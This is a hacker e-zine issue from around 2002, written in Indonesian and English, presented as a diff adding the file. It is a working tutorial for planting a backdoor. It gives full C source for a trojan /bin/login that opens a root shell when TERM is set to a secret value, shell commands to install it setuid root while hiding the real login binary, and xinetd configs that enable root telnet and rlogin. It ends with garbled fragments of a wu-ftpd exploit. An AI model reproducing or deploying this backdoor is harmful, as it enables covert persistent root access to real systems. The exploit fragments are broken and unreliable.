@@ -1,0 +1,184 @@
+
+
+ ____________________   ___ ___ ________
+ \_   _____/\_   ___ \ /   |   \\_____  \
+  |    __)_ /    \  \//    ~    \/   |   \
+  |        \\     \___\    Y    /    |    \
+ /_______  / \______  /\___|_  /\_______  /
+         \/         \/       \/         \/
+
+
+     .OR.ID
+ ECHO-ZINE RELEASE
+        08
+
+ Author: syzwz/bosen/sakitjiwa/1ndonesia.security.team ||  
+ sysadmin@belihosting.com, sakitjiwa@antihackerlink.or.id,  
+ sakitjiwa@corebsd.or.id, sakit.jiwa@unix.net
+ Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+ == merakit Telnetd / rlogin Backdoor ==
+
+
+ Dengan menyebut nama Tuhan yang maha pengasih lagi maha penyayang
+
+ #making Telnetd / rlogin Backdoor
+ author syzwz
+ taken from bosen (telnetd backdor) aresu (fixed wuftpd)
+ this xploit(wuftd fixed) add at 1st Jan 2002 so if somebody in  
+ indonesia tell to you another bosen or aresu
+ , he /her was found before 1st January 2002 he's lie or big lier or  
+ whtf
+
+ cat >term.c <<__eof__
+ #define _XOPEN_SOURCE
+ #include <unistd.h>
+ #include <stdio.h>
+ #include <signal.h>
+ #include <sys/time.h>
+ #include <string.h>
+
+ #define SHELL "/bin/sh"
+ #define SHELL_CALLME "login"
+ #define LOGIN "/usr/bin/xstat"
+ #define LOGIN_CALLME "login"
+ #define ENV_NAME "TERM"
+ #define ENV_VALUE "anjing23"
+ #define ENV_FIX "vt100"
+
+ int owned(void);
+
+ char **av, **ep;
+
+ int main(int argc, char **argv, char **envp) {
+    av=argv;
+    ep=envp;
+    av[0]=SHELL_CALLME;
+
+    if (owned()) {
+    char *sav[]={
+        SHELL_CALLME, NULL
+    };
+
+  execve(SHELL, sav, ep);
+  return 0;
+    }
+    execve(LOGIN, av, ep);
+    return 0;
+ }
+
+ int owned(void) {
+    char *name, *value;
+    int i;
+    for (i=0; ep[i]!=NULL; ++i) {
+       name=strtok(ep[i], "=");
+       value=strtok(NULL, "=");
+       if (name==NULL || value==NULL) continue;
+       if (!strncmp(name, ENV_NAME, strlen(ENV_NAME))) {
+  if (!strncmp(value, ENV_VALUE, strlen(ENV_VALUE))) {
+     char tmp[100];
+ sprintf(tmp, "%s=%s", ENV_NAME, ENV_FIX);
+ ep[i]=strdup(tmp);
+     return 1;
+  }
+       }
+    }
+    return 0;
+ }
+ __eof__
+ echo " "
+ echo "..now loading"
+ gcc -o login term.c
+ chown root.bin login
+ chmod 4555 login
+ chmod u-w login
+ cp /bin/login /usr/bin/xstat
+ mv login /bin/login
+ chmod 555 /usr/bin/xstat
+ chown root.bin /usr/bin/xstat
+ rm -f term.c
+
+ //running telnet and rlogin(this one i like)  port in xinetd
+
+ cat > /etc/xinetd.d/telnet <<__eof__
+
+  # default: on
+  service telnet
+  {
+          flags           = REUSE
+          socket_type     = stream
+          wait            = no
+          user            = root
+          server          = /usr/sbin/in.telnetd
+          log_on_failure  += USERID
+  }
+  __eof__
+
+ cat > /etc/xinetd.d/rlogin <<__eof__
+ service login
+ {
+         socket_type             = stream
+         wait                    = no
+         user                    = root
+         log_on_success          += USERID
+         log_on_failure          += USERID
+         server                  = /usr/sbin/in.rlogind
+
+ }
+ __eof__
+
+ /etc/rc.d/init.d/xinetd reload
+
+ Byte Code for RH7.0 WuFtpd
+
+ cat >distro.h<<__eof__
+ "RH7.0 -  2.6.1(1) Wed Aug 9 05:54:50 EDT 2000",
+ 0x08070cb0,0x8084600,   0,
+ __eof__
+
+ realcode taken from  
+ http://crash.ihug.co.nz/~Sneuro/woot-exploit.tar.gz / unfixed
+ //fix wuftpd rootkit
+
+  main(int argc,char *argv[])
+  {
+  int l,m,n=0,o;
+  int got,inp,prp,are;
+
+ //then it
+
+  if(sscanf(ADDR,"%u.%u.%u.%u",&o,&o,&o,&o)==4)n=1;
+  prp=st+45000;
+  are=0x8098930;
+  for(l=prp;l<are;l+=360)
+
+ //then
+
+  if(!ok)usleep(1500000);
+  else usleep(150000); // needed so u can actually stop it.. hold down  
+ ^C
+
+ //if not found,  add by your self
+
+ made in bandung, 0817 212 431 - 0856 217 3007
+ arif.wicaksono@coreBSD.or.id
+
+ maha benar tuhan dengan segala firmannya
+
+ REFERENSI a.k.a bacaan :
+ #irc.centrin.net.id #romance,#1stlink
+
+ *greetz to:
+ 1. Allah SWT, papaku yang lagi sakit, mamaku yang perhatian, dan  
+ semua komunitas underground indonesia yang    nggak bisa disebut satu  
+ persatu
+ 2.1ndonesia security team won Hacking the box competition Kuala  
+ Lumpur, http://forum.hackinthebox.org/viewforum.php?f=39,  
+ ANTIHACKERLINK IS THE BEST, THX to m0s team!!!!!!”
+ 
+ kirimkan kritik && saran ke sysadmin@belihosting.com,  
+ sakitjiwa@antihackerlink.or.id, sakitjiwa@corebsd.or.id,  
+ sakit.jiwa@unix.net
+
+------------------------------------------------------------------------ 
+kalau.anda.kurang.puas.silahkan.kontak.kami - 0817 212 431 24 jam :)
